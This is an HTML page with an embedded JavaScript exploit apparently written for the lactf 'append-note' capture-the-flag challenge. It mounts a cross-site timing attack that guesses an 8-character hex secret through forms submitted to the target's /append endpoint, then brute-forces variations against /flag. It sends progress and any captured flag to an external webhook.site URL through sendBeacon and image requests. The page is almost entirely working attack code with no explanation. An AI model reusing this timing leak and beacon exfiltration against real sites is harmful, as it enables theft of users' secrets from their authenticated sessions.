<!DOCTYPE html>
<html>
<head><title>Combined Attack</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-7wwed.instancer.lac.tf";
var WEBHOOK = "https://webhook.site/9aac3658-ff0f-45b5-b8ae-6f7d8d3c0eee";
var CHARS = "0123456789abcdef";

function report(msg) {
    navigator.sendBeacon(WEBHOOK, msg);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
}

report("COMBO_V1");

// Test single prefix via form navigation
function testPrefix(prefix) {
    return new Promise(function(resolve) {
        var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/?r=" + Math.random());
        var wname = "w" + Math.random().toString(36).slice(2);
        
        var form = document.createElement("form");
        form.method = "GET";
        form.action = url;
        form.target = wname;
        document.body.appendChild(form);
        
        var t0 = performance.now();
        form.submit();
        document.body.removeChild(form);
        
        setTimeout(function() {
            var elapsed = performance.now() - t0;
            try { window.open("", wname).close(); } catch(e) {}
            resolve(elapsed);
        }, 250);
    });
}

async function trySecret(secret) {
    try {
        var resp = await fetch(TARGET + "/flag?secret=" + secret);
        var text = await resp.text();
        if (text.indexOf("lactf") !== -1) {
            report("FLAG=" + text);
            document.getElementById("s").textContent = text;
            return true;
        }
    } catch(e) {}
    return false;
}

async function main() {
    report("START");
    
    try {
        // Phase 1: Timing attack to get candidate secret
        document.getElementById("s").textContent = "Phase 1: Timing...";
        
        var secretFast = "";
        var secretSlow = "";
        var allData = [];
        
        for (var pos = 0; pos < 8; pos++) {
            document.getElementById("s").textContent = "T" + pos;
            var results = [];
            
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                var time = await testPrefix(secretFast + c);
                results.push({ c: c, time: time });
            }
            
            results.sort(function(a,b) { return a.time - b.time; });
            allData.push(results);
            
            secretFast += results[0].c;
            secretSlow += results[results.length - 1].c;
            
            report("P" + pos + ":" + results[0].c + "-" + results[results.length-1].c);
        }
        
        report("TF=" + secretFast);
        report("TS=" + secretSlow);
        
        // Phase 2: Try direct secrets
        document.getElementById("s").textContent = "Phase 2: Testing...";
        if (await trySecret(secretFast)) return;
        if (await trySecret(secretSlow)) return;
        
        // Phase 3: Bruteforce single-char variations
        document.getElementById("s").textContent = "Phase 3: Bruteforce...";
        
        var bases = [secretFast, secretSlow];
        for (var b = 0; b < bases.length; b++) {
            var base = bases[b];
            for (var pos = 0; pos < 8; pos++) {
                for (var i = 0; i < CHARS.length; i++) {
                    var c = CHARS[i];
                    if (base[pos] === c) continue;
                    var variant = base.substr(0, pos) + c + base.substr(pos + 1);
                    if (await trySecret(variant)) return;
                }
            }
        }
        
        report("NOFLAG");
        document.getElementById("s").textContent = "Not found";
        
    } catch(e) {
        report("ERR=" + e.message);
    }
}

main();
</script>
</body>
</html>
